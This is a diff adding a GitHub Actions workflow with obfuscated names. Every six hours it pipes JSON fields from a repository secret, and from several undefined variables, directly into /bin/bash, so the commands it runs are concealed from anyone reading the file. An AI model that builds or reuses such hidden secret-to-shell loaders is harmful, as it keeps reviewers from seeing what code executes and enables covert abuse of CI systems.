@@ -1,0 +1,21 @@
+name: zhuzhihousong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuzhihousong
+        env:
+          g3659: ${{ secrets.g3659 }}
+        run: |
+          echo $g3659 | jq -r .upya238 | /bin/bash
+          echo $up2473 | jq -r .kr51270 | /bin/bash
+          echo $qnfgs7 | jq -r .d8264 | /bin/bash
+          echo $rajl3 | jq -r .yvub47167 | /bin/bash
+          echo $tfqb364 | jq -r .dyph508 | /bin/bash
+
